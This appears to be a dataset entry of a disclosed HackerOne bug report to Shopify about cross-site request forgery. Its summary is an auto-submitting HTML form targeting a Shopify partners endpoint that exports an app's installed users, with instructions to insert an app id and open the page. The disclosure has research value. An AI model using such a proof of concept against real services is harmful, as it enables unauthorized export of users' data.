@@ -1,0 +1,20 @@
+ReportLink:https://hackerone.com/reports/96470
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/harishkumar0394
+ReportedTo:Shopify(shopify)
+BountyAmount:500.0
+Severity:
+State:Closed
+DateOfDisclosure:07.12.2015 21:26:35
+
+Summary:
+
+<html>
+<head><title>csrf</title></head>
+<body onLoad="document.forms[0].submit()">
+<form action="https://app.shopify.com/services/partners/api_clients/1105664/export_installed_users" method="GET">
+</form>
+</body>
+</html>
+
+change the 1105664 app id to your app id the save as html file and run
